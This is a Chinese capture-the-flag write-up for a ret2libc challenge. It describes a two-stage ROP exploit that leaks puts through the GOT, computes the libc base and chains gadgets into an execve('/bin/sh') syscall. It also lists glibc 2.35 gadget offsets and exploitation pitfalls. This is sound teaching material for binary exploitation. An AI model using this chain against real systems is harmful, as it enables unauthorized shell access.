# WP：06-ret2libc

## 题目信息

- 类型：ret2libc（泄漏 libc 基址 → execve shell）
- 保护：No PIE、No Canary、NX
- 端口：13376

## 分析

程序没有 `win()` 也没有 `/bin/sh` 字符串，需要：

1. 泄漏 libc 真实地址（通过 puts@got）
2. 计算 libc 基址
3. 用 libc 内的 gadget 构造 execve syscall

## 为什么不用 system()

`system()` 内部调用 `fork()`，在 socat `EXEC` 模式下，fork 出的子进程 I/O 无法正常连接到 socket，导致 shell 无输出。

`execve` syscall 直接替换当前进程，不 fork，I/O 保持不变，可以正常交互。

## 两阶段 Exploit

### Stage 1：泄漏

```
[0x28 padding] [ret] [pop_rdi] [puts@got] [puts@plt] [vuln]
```

puts 打印 `puts@got` 的内容（即 puts 在内存中的真实地址），然后返回 `vuln` 等待第二次输入。

```python
libc_base = leaked_puts - libc.symbols['puts']
```

### Stage 2：execve syscall

```
[0x28 padding] [ret]
[pop_rdi]  ["/bin/sh" addr]
[pop_rsi]  [0]
[pop_rdx_rbx] [0] [0]   # pop rdx; pop rbx; ret，需要两个值
[pop_rax]  [59]          # SYS_execve = 59
[syscall]
```

## 注意事项

- `pop rdx` gadget 实为 `pop rdx; pop rbx; ret`，需多填一个 junk 值
- 泄漏后要消费掉 puts 输出末尾的 `\n`，否则下一次 recv 会多出一字节
- Stage 2 发送后要先 `recvuntil(b'Bye\n')` 消费 vuln 的输出，再 interactive

## 关键地址（libc 偏移，glibc 2.35）

| 符号 | 偏移 |
|------|------|
| puts | 0x80e50 |
| /bin/sh | 0x1d8678 |
| pop rdi; ret | 0x2a3e5 |
| pop rsi; ret | 0x2be51 |
| pop rdx; pop rbx; ret | 0x904a9 |
| pop rax; ret | 0x45eb0 |
| syscall; ret | 0x91316 |
